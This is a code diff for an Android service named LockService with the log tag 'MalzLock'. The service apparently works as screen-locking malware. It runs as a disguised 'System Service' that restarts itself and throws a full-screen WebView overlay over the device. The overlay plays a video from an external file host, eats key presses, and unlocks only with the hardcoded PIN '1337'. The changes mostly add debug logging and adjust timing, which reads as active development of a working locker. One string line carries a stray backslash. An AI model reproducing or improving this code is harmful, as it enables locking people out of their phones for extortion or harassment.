@@ -10,6 +10,7 @@ import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.util.Base64;
+import android.util.Log;
 import android.view.WindowManager;
 import android.webkit.JavascriptInterface;
 import android.webkit.WebChromeClient;
@@ -20,7 +21,8 @@ import java.nio.charset.StandardCharsets;
 
 public class LockService extends Service {
 
-    private static final String VIDEO_URL = "https://h.uguu.se/JNjCAEri.mp4";
+    private static final String TAG = "MalzLock";
+    private static final String VIDEO_URL = "https://h.uguu.se/JNjCAEri.mp4"\;
     private static final String CORRECT_PIN = "1337";
 
     private WindowManager wm;
@@ -30,35 +32,45 @@ public class LockService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
+        Log.d(TAG, "onCreate");
         wm = (WindowManager) getSystemService(WINDOW_SERVICE);
     }
 
     @Override
     public int onStartCommand(Intent i, int f, int s) {
+        Log.d(TAG, "onStartCommand");
+
         try {
             NotificationChannel ch = new NotificationChannel(
-                "sys", "System", NotificationManager.IMPORTANCE_MIN);
+                "sys", "System", NotificationManager.IMPORTANCE_LOW);
             getSystemService(NotificationManager.class).createNotificationChannel(ch);
             Notification n = new Notification.Builder(this, "sys")
                 .setContentTitle("System Service")
+                .setContentText("Running")
                 .setSmallIcon(android.R.drawable.ic_menu_manage)
                 .build();
             startForeground(1, n);
-        } catch (Exception ignored) {}
+        } catch (Exception e) {
+            Log.e(TAG, "Notification error: " + e.getMessage());
+        }
 
         new Handler(getMainLooper()).postDelayed(new Runnable() {
-            @Override public void run() { showLock(); }
-        }, 2000);
+            @Override public void run() {
+                showLock();
+            }
+        }, 1500);
 
         return START_STICKY;
     }
 
     private void showLock() {
         if (unlocked) return;
+        if (webView != null) return;
+
         new Handler(getMainLooper()).post(new Runnable() {
             @Override public void run() {
                 try {
-                    if (webView != null) return;
+                    Log.d(TAG, "showLock start");
 
                     webView = new WebView(LockService.this);
                     WebSettings ws = webView.getSettings();
@@ -69,8 +81,6 @@ public class LockService extends Service {
                     ws.setAllowContentAccess(true);
                     ws.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
                     ws.setCacheMode(WebSettings.LOAD_DEFAULT);
-                    ws.setLoadWithOverviewMode(true);
-                    ws.setUseWideViewPort(true);
 
                     webView.setWebViewClient(new WebViewClient());
                     webView.setWebChromeClient(new WebChromeClient());
@@ -107,7 +117,12 @@ public class LockService extends Service {
                     wm.addView(webView, lp);
                     webView.setOnKeyListener((v, k, e) -> true);
 
-                } catch (Exception ignored) {}
+                    Log.d(TAG, "overlay added");
+
+                } catch (Exception e) {
+                    Log.e(TAG, "showLock error: " + e.getMessage());
+                    e.printStackTrace();
+                }
             }
         });
     }
@@ -168,7 +183,6 @@ public class LockService extends Service {
         sb.append("function backspace(){var p=document.getElementById('pin');p.value=p.value.slice(0,-1);}");
         sb.append("function checkPin(){var p=document.getElementById('pin').value;if(p===CORRECT_PIN){if(window.Android){window.Android.unlock();}}else{setTimeout(function(){document.getElementById('pin').value='';},300);}}");
         sb.append("document.addEventListener('contextmenu',function(e){e.preventDefault();});");
-        sb.append("document.addEventListener('selectstart',function(e){e.preventDefault();});");
         sb.append("</script></body></html>");
 
         return sb.toString();
